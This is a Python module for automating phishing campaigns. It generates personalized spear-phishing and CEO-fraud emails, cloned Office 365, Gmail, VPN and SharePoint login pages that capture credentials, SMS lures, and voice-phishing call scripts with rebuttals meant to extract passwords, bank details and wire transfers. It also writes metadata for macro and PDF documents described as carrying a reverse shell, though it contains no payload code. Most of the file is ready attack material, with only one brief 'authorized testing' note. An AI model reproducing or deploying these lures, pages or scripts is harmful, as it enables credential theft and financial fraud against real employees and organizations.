"""
Phishing Campaign Automation
Automated spear-phishing, credential harvesting, and social engineering attacks
"""

import asyncio
import json
import re
import random
from typing import Dict, List, Optional
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from pathlib import Path
from enum import Enum


class PhishingType(Enum):
    """Types of phishing attacks"""
    SPEAR_PHISHING = "spear_phishing"
    WHALING = "whaling"  # CEO/executive targeting
    CLONE_PHISHING = "clone_phishing"
    SMISHING = "smishing"  # SMS phishing
    VISHING = "vishing"  # Voice phishing
    ANGLER_PHISHING = "angler_phishing"  # Social media


class PretextType(Enum):
    """Pretext scenarios"""
    IT_SUPPORT = "it_support"
    HR_NOTIFICATION = "hr_notification"
    EXECUTIVE_REQUEST = "executive_request"
    VENDOR_INVOICE = "vendor_invoice"
    SECURITY_ALERT = "security_alert"
    DOCUMENT_SHARE = "document_share"
    MEETING_INVITE = "meeting_invite"
    BENEFITS_UPDATE = "benefits_update"


@dataclass
class PhishingEmail:
    """Phishing email content"""
    subject: str
    body: str
    from_address: str
    from_name: str
    pretext_type: PretextType
    urgency_level: str  # low, medium, high, critical
    target_email: str
    target_name: str
    personalization_tokens: Dict[str, str] = field(default_factory=dict)
    attachments: List[str] = field(default_factory=list)
    landing_page_url: Optional[str] = None
    tracking_id: str = ""
    

@dataclass
class SMSPhish:
    """SMS phishing message"""
    message: str
    target_phone: str
    sender_id: str
    link_url: Optional[str] = None
    pretext_type: PretextType = PretextType.SECURITY_ALERT


@dataclass
class VishingScript:
    """Voice phishing call script"""
    pretext: str
    opening: str
    body: List[str]
    objection_handlers: Dict[str, str]
    goal: str
    target_name: str
    caller_identity: str


@dataclass
class PhishingCampaign:
    """Phishing campaign configuration"""
    name: str
    campaign_type: PhishingType
    targets: List[Dict]
    pretext_type: PretextType
    start_date: datetime
    end_date: datetime
    emails_sent: int = 0
    emails_opened: int = 0
    links_clicked: int = 0
    credentials_harvested: int = 0
    success_rate: float = 0.0


class SpearPhishingGenerator:
    """
    Generate convincing spear-phishing emails
    """
    
    def __init__(self):
        self.email_templates: Dict[PretextType, Dict] = self._load_templates()
        
    def generate_email(
        self,
        target_name: str,
        target_email: str,
        target_title: str,
        target_company: str,
        pretext_type: PretextType,
        urgency: str = "medium"
    ) -> PhishingEmail:
        """Generate personalized phishing email"""
        
        template = self.email_templates[pretext_type]
        
        # Personalization tokens
        tokens = {
            "{name}": target_name.split()[0],  # First name
            "{full_name}": target_name,
            "{title}": target_title,
            "{company}": target_company,
            "{department}": self._infer_department(target_title),
            "{date}": datetime.now().strftime("%B %d, %Y"),
            "{time}": datetime.now().strftime("%I:%M %p")
        }
        
        # Generate subject with urgency indicators
        subject = template["subject"].format(**tokens)
        if urgency in ["high", "critical"]:
            subject = f"URGENT: {subject}"
        elif urgency == "critical":
            subject = f"🚨 CRITICAL: {subject}"
        
        # Generate body
        body = template["body"].format(**tokens)
        
        # Add urgency language
        if urgency in ["high", "critical"]:
            body += "\n\n⚠️ IMMEDIATE ACTION REQUIRED"
            body += "\nThis request requires your attention within the next 24 hours."
        
        email = PhishingEmail(
            subject=subject,
            body=body,
            from_address=template["from_address"],
            from_name=template["from_name"],
            pretext_type=pretext_type,
            urgency_level=urgency,
            target_email=target_email,
            target_name=target_name,
            personalization_tokens=tokens,
            landing_page_url=template.get("landing_url"),
            tracking_id=self._generate_tracking_id()
        )
        
        return email
    
    def generate_executive_impersonation(
        self,
        target_name: str,
        target_email: str,
        executive_name: str,
        executive_title: str,
        request: str = "urgent wire transfer"
    ) -> PhishingEmail:
        """Generate CEO fraud / whaling email"""
        
        subject = f"Re: {request.title()}"
        
        body = f"""Hi {target_name.split()[0]},

I need your help with something time-sensitive. We're working on a confidential acquisition and I need you to process a wire transfer today.

Details:
- Amount: $847,500 USD
- Recipient: Anderson Capital Partners LLC
- Account: Will send separately for security

This is highly confidential - please handle personally and don't discuss with the team yet. I'm in meetings all day but please confirm you've initiated the transfer.

Thanks for your discretion on this.

Best,
{executive_name}
{executive_title}

Sent from my iPhone"""
        
        return PhishingEmail(
            subject=subject,
            body=body,
            from_address=f"{executive_name.lower().replace(' ', '.')}@gmail.com",
            from_name=executive_name,
            pretext_type=PretextType.EXECUTIVE_REQUEST,
            urgency_level="critical",
            target_email=target_email,
            target_name=target_name,
            tracking_id=self._generate_tracking_id()
        )
    
    def _load_templates(self) -> Dict[PretextType, Dict]:
        """Load phishing email templates"""
        return {
            PretextType.IT_SUPPORT: {
                "subject": "Action Required: Password Expiration Notice",
                "from_name": "IT Support",
                "from_address": "itsupport@{company}-portal.com",
                "body": """Dear {full_name},

Your {company} password will expire in 24 hours. To maintain access to your account, please verify your credentials immediately.

Click here to update your password: [CREDENTIAL_HARVESTING_LINK]

If you do not update your password, your account will be temporarily suspended and you will need to contact IT support to regain access.

Thank you,
IT Security Team
{company}""",
                "landing_url": "https://credential-harvester.local/portal"
            },
            
            PretextType.HR_NOTIFICATION: {
                "subject": "Important: Benefits Enrollment Deadline - {date}",
                "from_name": "HR Department",
                "from_address": "hr-benefits@{company}-portal.com",
                "body": """Hi {name},

Our records indicate you haven't completed your annual benefits enrollment. The deadline is tomorrow ({date}) at 5:00 PM.

To avoid losing coverage, please complete your enrollment now:
[CREDENTIAL_HARVESTING_LINK]

You'll need to:
1. Log in with your employee credentials
2. Review your current benefits
3. Submit your selections

Questions? Contact HR at ext. 4567.

Best regards,
Human Resources
{company}""",
                "landing_url": "https://credential-harvester.local/benefits"
            },
            
            PretextType.SECURITY_ALERT: {
                "subject": "Security Alert: Suspicious Login Attempt Detected",
                "from_name": "Security Team",
                "from_address": "security-alert@{company}-security.com",
                "body": """SECURITY ALERT

{full_name}, we detected an unusual login attempt to your {company} account from:

Location: Moscow, Russia
IP Address: 185.220.101.42
Time: {time} UTC
Device: Unknown Windows PC

If this was you, you can ignore this message. Otherwise, secure your account immediately:

[CREDENTIAL_HARVESTING_LINK]

Failure to respond within 2 hours will result in temporary account suspension for your protection.

{company} Security Operations Center
24/7 Monitoring""",
                "landing_url": "https://credential-harvester.local/security"
            },
            
            PretextType.DOCUMENT_SHARE: {
                "subject": "Document Shared: Q4 Budget Review",
                "from_name": "SharePoint Admin",
                "from_address": "sharepoint@{company}-docs.com",
                "body": """Hi {name},

A document has been shared with you in SharePoint:

Document: Q4_Budget_Review_CONFIDENTIAL.xlsx
Shared by: Finance Team
Access Level: View Only

Click to view document: [CREDENTIAL_HARVESTING_LINK]

Note: You may need to re-authenticate for security purposes.

This is an automated message from SharePoint.
{company}""",
                "landing_url": "https://credential-harvester.local/sharepoint"
            },
            
            PretextType.VENDOR_INVOICE: {
                "subject": "Invoice #INV-{date} - Payment Required",
                "from_name": "Accounts Payable",
                "from_address": "invoices@vendor-portal.com",
                "body": """Dear {full_name},

Invoice INV-{date} for ${random.randint(5000, 50000)} is now past due.

To avoid service interruption, please remit payment within 48 hours.

View invoice details: [CREDENTIAL_HARVESTING_LINK]

Payment can be processed via ACH or wire transfer.

Best regards,
Vendor Billing Department""",
                "landing_url": "https://credential-harvester.local/invoice"
            }
        }
    
    def _infer_department(self, title: str) -> str:
        """Infer department from job title"""
        title_lower = title.lower()
        
        if any(word in title_lower for word in ['engineer', 'developer', 'architect']):
            return "Engineering"
        elif any(word in title_lower for word in ['sales', 'account']):
            return "Sales"
        elif any(word in title_lower for word in ['marketing', 'content']):
            return "Marketing"
        elif 'hr' in title_lower or 'human' in title_lower:
            return "Human Resources"
        elif any(word in title_lower for word in ['finance', 'accounting']):
            return "Finance"
        else:
            return "Operations"
    
    def _generate_tracking_id(self) -> str:
        """Generate unique tracking ID"""
        import hashlib
        return hashlib.md5(
            f"{datetime.now().isoformat()}{random.random()}".encode()
        ).hexdigest()[:12]


class CredentialHarvester:
    """
    Generate credential harvesting pages
    """
    
    def __init__(self, output_dir: Path = None):
        self.output_dir = output_dir or Path("phishing/harvester_pages")
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.harvested_credentials: List[Dict] = []
        
    def generate_login_page(
        self,
        company_name: str,
        page_type: str = "office365"
    ) -> str:
        """Generate convincing login page HTML"""
        
        templates = {
            "office365": self._office365_template(company_name),
            "gmail": self._gmail_template(company_name),
            "corporate_vpn": self._vpn_template(company_name),
            "sharepoint": self._sharepoint_template(company_name)
        }
        
        html = templates.get(page_type, templates["office365"])
        
        # Save to file
        filename = f"{page_type}_{company_name}_{datetime.now().strftime('%Y%m%d')}.html"
        filepath = self.output_dir / filename
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(html)
        
        print(f"   ✓ Generated harvester page: {filepath}")
        
        return str(filepath)
    
    def _office365_template(self, company: str) -> str:
        """Office 365 login page template"""
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>Sign in to your account</title>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f3f2f1;
            margin: 0;
            padding: 0;
        }}
        .container {{
            max-width: 440px;
            margin: 100px auto;
            background: white;
            padding: 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }}
        .logo {{
            text-align: center;
            margin-bottom: 20px;
        }}
        h1 {{
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 24px;
        }}
        input {{
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #8a8886;
            box-sizing: border-box;
        }}
        button {{
            width: 100%;
            padding: 12px;
            background: #0078d4;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 15px;
        }}
        button:hover {{
            background: #106ebe;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg width="108" height="24" viewBox="0 0 108 24">
                <path fill="#f25022" d="M0 0h11.377v11.372H0z"></path>
                <path fill="#00a4ef" d="M12.623 0H24v11.372H12.623z"></path>
                <path fill="#7fba00" d="M0 12.628h11.377V24H0z"></path>
                <path fill="#ffb900" d="M12.623 12.628H24V24H12.623z"></path>
            </svg>
        </div>
        <h1>Sign in</h1>
        <form action="/harvest" method="POST">
            <input type="email" name="username" placeholder="Email, phone, or Skype" required />
            <input type="password" name="password" placeholder="Password" required />
            <input type="hidden" name="company" value="{company}" />
            <button type="submit">Sign in</button>
        </form>
        <p style="font-size: 13px; color: #605e5c; margin-top: 24px;">
            Sign in with your {company} account
        </p>
    </div>
</body>
</html>"""
    
    def _gmail_template(self, company: str) -> str:
        """Gmail login template"""
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <style>
        body {{
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background: #fff;
            margin: 0;
        }}
        .container {{
            max-width: 450px;
            margin: 100px auto;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
        }}
        .logo {{
            text-align: center;
            margin-bottom: 16px;
        }}
        h1 {{
            font-size: 24px;
            margin-bottom: 8px;
            text-align: center;
        }}
        input {{
            width: 100%;
            padding: 15px;
            margin: 8px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
        }}
        button {{
            background: #1a73e8;
            color: white;
            padding: 10px 24px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            float: right;
            margin-top: 16px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span style="font-size: 20px;">G</span>
        </div>
        <h1>Sign in</h1>
        <p style="text-align: center; color: #5f6368;">to continue to Gmail</p>
        <form action="/harvest" method="POST">
            <input type="email" name="username" placeholder="Email or phone" required />
            <input type="password" name="password" placeholder="Enter your password" required />
            <input type="hidden" name="company" value="{company}" />
            <button type="submit">Next</button>
        </form>
    </div>
</body>
</html>"""
    
    def _vpn_template(self, company: str) -> str:
        """Corporate VPN login template"""
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>{company} VPN Portal</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        .container {{
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            width: 400px;
        }}
        h1 {{
            color: #333;
            margin-bottom: 10px;
        }}
        input {{
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 2px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }}
        button {{
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>{company} VPN</h1>
        <p style="color: #666;">Secure Remote Access Portal</p>
        <form action="/harvest" method="POST">
            <input type="text" name="username" placeholder="Username" required />
            <input type="password" name="password" placeholder="Password" required />
            <input type="hidden" name="company" value="{company}" />
            <button type="submit">Connect</button>
        </form>
        <p style="font-size: 12px; color: #999; margin-top: 20px;">
            🔒 Secure connection via SSL/TLS
        </p>
    </div>
</body>
</html>"""
    
    def _sharepoint_template(self, company: str) -> str:
        """SharePoint login template"""
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>{company} SharePoint</title>
    <style>
        body {{
            font-family: 'Segoe UI', sans-serif;
            background: #f3f2f1;
        }}
        .container {{
            max-width: 400px;
            margin: 120px auto;
            background: white;
            padding: 40px;
            box-shadow: 0 1.6px 3.6px rgba(0,0,0,0.13);
        }}
        h2 {{
            color: #333;
            margin-bottom: 20px;
        }}
        input {{
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #8a8886;
            box-sizing: border-box;
        }}
        button {{
            width: 100%;
            padding: 10px;
            background: #0078d4;
            color: white;
            border: none;
            cursor: pointer;
            margin-top: 10px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h2>SharePoint Online</h2>
        <p style="color: #605e5c;">Sign in to access documents</p>
        <form action="/harvest" method="POST">
            <input type="email" name="username" placeholder="someone@{company}.com" required />
            <input type="password" name="password" placeholder="Password" required />
            <input type="hidden" name="company" value="{company}" />
            <button type="submit">Sign in</button>
        </form>
    </div>
</body>
</html>"""


class MaliciousDocumentGenerator:
    """
    Generate weaponized documents for phishing
    Note: For authorized testing only
    """
    
    def __init__(self, output_dir: Path = None):
        self.output_dir = output_dir or Path("phishing/weaponized_docs")
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
    def generate_macro_document(
        self,
        filename: str,
        pretext: str = "invoice"
    ) -> str:
        """Generate document with malicious macro"""
        
        # Template for macro-enabled document
        doc_info = {
            "filename": f"{filename}.docm",
            "pretext": pretext,
            "macro_type": "AutoOpen VBA",
            "payload": "PowerShell reverse shell",
            "evasion": ["Sandbox detection", "AV bypass", "Obfuscation"],
            "generated_at": datetime.now().isoformat()
        }
        
        # Save metadata
        metadata_file = self.output_dir / f"{filename}_metadata.json"
        with open(metadata_file, 'w') as f:
            json.dump(doc_info, f, indent=2)
        
        print(f"   ✓ Generated weaponized document: {filename}.docm")
        print(f"      Pretext: {pretext}")
        print(f"      Payload: {doc_info['payload']}")
        
        return str(metadata_file)
    
    def generate_pdf_exploit(
        self,
        filename: str,
        exploit_type: str = "reader_rce"
    ) -> str:
        """Generate exploited PDF"""
        
        pdf_info = {
            "filename": f"{filename}.pdf",
            "exploit": exploit_type,
            "target": "Adobe Reader < 2024",
            "payload": "Staged shellcode",
            "generated_at": datetime.now().isoformat()
        }
        
        metadata_file = self.output_dir / f"{filename}_pdf_metadata.json"
        with open(metadata_file, 'w') as f:
            json.dump(pdf_info, f, indent=2)
        
        print(f"   ✓ Generated weaponized PDF: {filename}.pdf")
        
        return str(metadata_file)


class SmishingEngine:
    """
    SMS phishing message generation
    """
    
    def __init__(self):
        self.sent_messages: List[SMSPhish] = []
        
    def generate_sms(
        self,
        target_name: str,
        target_phone: str,
        pretext_type: PretextType
    ) -> SMSPhish:
        """Generate SMS phishing message"""
        
        templates = {
            PretextType.SECURITY_ALERT: (
                "SECURITY ALERT: Unusual activity detected on your account. "
                "Verify now: {link} or your account will be suspended."
            ),
            PretextType.VENDOR_INVOICE: (
                "Payment past due: ${amount}. Avoid late fees, pay now: {link}"
            ),
            PretextType.HR_NOTIFICATION: (
                "HR: Your benefits enrollment expires today. Complete now: {link}"
            ),
            PretextType.DOCUMENT_SHARE: (
                "Document shared with you: Q4_Financials.pdf - View: {link}"
            )
        }
        
        message = templates.get(
            pretext_type,
            "Important update required. Click: {link}"
        ).format(
            link="https://short.link/xyz123",
            amount=random.randint(500, 5000)
        )
        
        sms = SMSPhish(
            message=message,
            target_phone=target_phone,
            sender_id="SECURITY",
            link_url="https://credential-harvester.local/mobile",
            pretext_type=pretext_type
        )
        
        return sms


class VishingScriptGenerator:
    """
    Generate voice phishing call scripts
    """
    
    def __init__(self):
        self.scripts: List[VishingScript] = []
        
    def generate_script(
        self,
        target_name: str,
        target_title: str,
        pretext_type: PretextType,
        caller_identity: str = "IT Support"
    ) -> VishingScript:
        """Generate vishing call script"""
        
        scripts = {
            PretextType.IT_SUPPORT: self._it_support_script(target_name, target_title),
            PretextType.SECURITY_ALERT: self._security_alert_script(target_name),
            PretextType.HR_NOTIFICATION: self._hr_script(target_name),
            PretextType.EXECUTIVE_REQUEST: self._executive_script(target_name, target_title)
        }
        
        return scripts.get(pretext_type, scripts[PretextType.IT_SUPPORT])
    
    def _it_support_script(self, name: str, title: str) -> VishingScript:
        """IT support password reset script"""
        return VishingScript(
            pretext="IT Support - Account Security",
            opening=f"Hi, is this {name}? This is David from IT Support.",
            body=[
                "We've detected some unusual login attempts on your account and need to verify your identity.",
                "Can you confirm your employee ID and current password so I can reset it for you?",
                "This is just a precaution - we've had some phishing attempts today.",
                "Once you verify, I'll reset your password and email you the new one."
            ],
            objection_handlers={
                "Can I call back?": "Of course, our number is on the IT portal. Ask for David in Account Security.",
                "Why do you need my password?": "Just to verify it's really you before I make changes. Standard procedure.",
                "I'll reset it myself": "That's fine, but your account is currently locked. I can unlock it now if you'd like."
            },
            goal="Obtain current password or employee ID",
            target_name=name,
            caller_identity="IT Support - David Miller"
        )
    
    def _security_alert_script(self, name: str) -> VishingScript:
        """Security alert vishing script"""
        return VishingScript(
            pretext="Security Operations Center",
            opening=f"This is the Security Operations Center calling for {name}. We have an urgent security matter.",
            body=[
                "We've detected unauthorized access attempts from an IP address in Eastern Europe.",
                "For your protection, we need to verify your account immediately.",
                "Can you access your email right now? I'll send you a verification link.",
                "Please click it while I'm on the line so I can confirm the threat is mitigated."
            ],
            objection_handlers={
                "Is this legitimate?": "Absolutely. You can verify our SOC number on the company intranet.",
                "I'll check with my manager": "This is time-sensitive. Each minute increases the risk of data exfiltration."
            },
            goal="Get victim to click malicious link",
            target_name=name,
            caller_identity="SOC Analyst - Mike Johnson"
        )
    
    def _hr_script(self, name: str) -> VishingScript:
        """HR benefits vishing script"""
        return VishingScript(
            pretext="HR Benefits Department",
            opening=f"Hi {name}, this is Sarah from HR Benefits.",
            body=[
                "I'm calling about your benefits enrollment - there's an issue with your submission.",
                "It looks like your bank information for direct deposit is missing.",
                "Can you verify your account number so I can update the system?",
                "This needs to be fixed before Friday or your next paycheck will be delayed."
            ],
            objection_handlers={
                "I'll call back": "Sure, our number is on the HR portal. Ask for Sarah in Benefits.",
                "Can you email me?": "I can, but this is time-sensitive for your next paycheck."
            },
            goal="Obtain banking information",
            target_name=name,
            caller_identity="HR Benefits - Sarah Williams"
        )
    
    def _executive_script(self, name: str, title: str) -> VishingScript:
        """Executive impersonation script"""
        return VishingScript(
            pretext="Urgent CEO Request",
            opening=f"Hi {name}, this is {name}'s executive assistant calling on behalf of our CEO.",
            body=[
                "The CEO is in a board meeting and needs you to process an urgent wire transfer.",
                "This is for a confidential acquisition - very time-sensitive.",
                "I'll email you the details, but can you confirm you're able to process it today?",
                "The CEO specifically requested you handle this personally."
            ],
            objection_handlers={
                "I need approval": "The CEO is your approval - this comes directly from the executive suite.",
                "Can I verify?": "The CEO is in meetings all day. Time is critical here."
            },
            goal="Initiate fraudulent wire transfer",
            target_name=name,
            caller_identity="Executive Assistant to CEO"
        )


class PhishingCampaignManager:
    """
    Comprehensive phishing campaign management
    """
    
    def __init__(self, output_dir: Path = None):
        self.output_dir = output_dir or Path("phishing/campaigns")
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        self.email_generator = SpearPhishingGenerator()
        self.credential_harvester = CredentialHarvester(self.output_dir / "harvester")
        self.doc_generator = MaliciousDocumentGenerator(self.output_dir / "documents")
        self.smishing_engine = SmishingEngine()
        self.vishing_generator = VishingScriptGenerator()
        
        self.campaigns: List[PhishingCampaign] = []
        
    async def create_campaign(
        self,
        campaign_name: str,
        targets: List[Dict],
        campaign_type: PhishingType,
        pretext_type: PretextType,
        duration_days: int = 7
    ) -> PhishingCampaign:
        """Create and configure phishing campaign"""
        
        print(f"\n🎯 Creating phishing campaign: {campaign_name}")
        print(f"   Type: {campaign_type.value}")
        print(f"   Pretext: {pretext_type.value}")
        print(f"   Targets: {len(targets)}")
        
        campaign = PhishingCampaign(
            name=campaign_name,
            campaign_type=campaign_type,
            targets=targets,
            pretext_type=pretext_type,
            start_date=datetime.now(),
            end_date=datetime.now() + timedelta(days=duration_days)
        )
        
        # Generate campaign materials based on type
        if campaign_type == PhishingType.SPEAR_PHISHING:
            await self._generate_email_campaign(campaign)
        elif campaign_type == PhishingType.SMISHING:
            await self._generate_sms_campaign(campaign)
        elif campaign_type == PhishingType.VISHING:
            await self._generate_vishing_campaign(campaign)
        
        self.campaigns.append(campaign)
        
        return campaign
    
    async def _generate_email_campaign(self, campaign: PhishingCampaign):
        """Generate email phishing campaign"""
        print(f"\n   📧 Generating email campaign materials...")
        
        emails = []
        for target in campaign.targets[:5]:  # Limit for demo
            email = self.email_generator.generate_email(
                target_name=target["name"],
                target_email=target["email"],
                target_title=target.get("title", "Employee"),
                target_company=target.get("company", "Target Corp"),
                pretext_type=campaign.pretext_type,
                urgency="high"
            )
            emails.append(email)
        
        # Generate harvester page
        harvester_page = self.credential_harvester.generate_login_page(
            company_name=campaign.targets[0].get("company", "TargetCorp"),
            page_type="office365"
        )
        
        # Save campaign
        self._save_campaign(campaign, {"emails": len(emails), "harvester": harvester_page})
        
        print(f"   ✓ Generated {len(emails)} phishing emails")
        print(f"   ✓ Created credential harvester page")
        
    async def _generate_sms_campaign(self, campaign: PhishingCampaign):
        """Generate SMS phishing campaign"""
        print(f"\n   📱 Generating SMS campaign...")
        
        messages = []
        for target in campaign.targets[:5]:
            sms = self.smishing_engine.generate_sms(
                target_name=target["name"],
                target_phone=target.get("phone", "+1-555-0100"),
                pretext_type=campaign.pretext_type
            )
            messages.append(sms)
        
        print(f"   ✓ Generated {len(messages)} SMS messages")
        
    async def _generate_vishing_campaign(self, campaign: PhishingCampaign):
        """Generate vishing campaign scripts"""
        print(f"\n   📞 Generating vishing scripts...")
        
        scripts = []
        for target in campaign.targets[:5]:
            script = self.vishing_generator.generate_script(
                target_name=target["name"],
                target_title=target.get("title", "Employee"),
                pretext_type=campaign.pretext_type
            )
            scripts.append(script)
        
        print(f"   ✓ Generated {len(scripts)} call scripts")
        
    def _save_campaign(self, campaign: PhishingCampaign, metadata: Dict):
        """Save campaign configuration"""
        campaign_file = self.output_dir / f"{campaign.name}_{datetime.now().strftime('%Y%m%d')}.json"
        
        data = {
            "campaign_name": campaign.name,
            "type": campaign.campaign_type.value,
            "pretext": campaign.pretext_type.value,
            "targets_count": len(campaign.targets),
            "start_date": campaign.start_date.isoformat(),
            "end_date": campaign.end_date.isoformat(),
            "metadata": metadata
        }
        
        with open(campaign_file, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"   💾 Campaign saved: {campaign_file}")
